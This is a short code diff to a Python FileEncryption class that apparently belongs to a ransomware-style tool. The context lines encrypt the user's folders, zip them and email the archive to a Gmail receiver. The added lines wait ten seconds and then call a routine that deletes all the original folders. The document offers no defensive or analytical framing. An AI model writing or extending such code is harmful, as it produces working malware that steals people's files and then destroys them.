@@ -1,5 +1,6 @@
 # Built-in modules
 import os
+import time
 import zipfile
 import shutil
 
@@ -86,6 +87,7 @@ class FileEncryption(Data_Class):
             if os.path.exists(folder):
                 self.encrypt_folder(folder)
 
+
         # Zip the "encrypted_folders" directory
         with zipfile.ZipFile(self.zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
             for root, _, files in os.walk(self.encrypted_folders_dir):
@@ -98,6 +100,10 @@ class FileEncryption(Data_Class):
         mailer.sender_mail = self.gmail_address_sender  # Set your own Gmail address
         mailer.receiver_mail = self.gmail_address_receiver  # Set your own Gmail address
         mailer.send_mail(self, self.zip_file_path)
+
+        time.sleep(10)
+
+        self.delete_files()
 
     def delete_files(self):
         # Delete all the original folders
